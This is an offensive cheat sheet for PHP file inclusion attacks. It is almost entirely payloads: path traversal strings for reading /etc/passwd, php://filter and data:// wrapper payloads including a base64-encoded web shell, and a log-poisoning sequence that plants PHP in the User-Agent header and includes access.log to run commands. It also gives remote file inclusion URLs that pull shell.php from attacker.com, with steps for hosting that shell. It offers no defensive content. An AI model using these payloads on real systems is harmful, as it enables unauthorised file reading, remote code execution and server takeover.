# File Inclusion

Local File Inclusion (LFI) and Remote File Inclusion (RFI) occur when user input is used to build a file path for `include()`, `require()`, or similar functions without proper sanitization.

## LFI Detection

```
# Basic path traversal
/etc/passwd
../../../etc/passwd
....//....//....//etc/passwd   # filter bypass double-dot

# Windows
..\..\..\..\Windows\System32\drivers\etc\hosts
C:\Windows\System32\drivers\etc\hosts
```

## LFI PHP Wrappers

```
# Read PHP source (base64 encoded)
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.toupper/resource=index.php

# Execute arbitrary code
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=
# (base64 of: <?php system($_GET["cmd"]); ?>)

# Read stdin
php://input
```

## Log Poisoning → RCE

```bash
# 1. Inject PHP into User-Agent (poisons access.log)
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target/

# 2. Include the log
http://target/?page=../../../../var/log/apache2/access.log&cmd=id

# Common log locations
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/fd/2           # stderr
```

## RFI

```bash
# Requires allow_url_include = On in php.ini
http://target/?page=http://attacker.com/shell.php
http://target/?page=ftp://attacker.com/shell.php

# Host a PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80
```

## /proc/self Tricks

```
/proc/self/environ    # environment variables (may contain User-Agent)
/proc/self/fd/0       # stdin
/proc/self/cmdline    # process arguments
```
